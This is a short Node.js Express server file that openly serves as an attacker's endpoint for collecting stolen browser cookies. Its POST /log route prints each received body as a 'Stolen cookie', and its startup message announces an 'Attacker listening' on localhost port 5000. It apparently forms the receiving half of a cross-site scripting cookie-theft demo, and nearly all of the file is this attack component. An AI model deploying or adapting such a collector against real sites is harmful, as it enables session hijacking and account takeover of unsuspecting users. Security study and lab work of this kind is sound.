const express = require("express");
const path = require("path");
const app = express();

app.use(express.text());
app.use(express.static("public"));

app.post("/log", (req, res) => {
    console.log("Stolen cookie:", req.body);
    res.sendStatus(200);
});

app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(5000, () => {
    console.log("Attacker listening on http://localhost:5000");
});
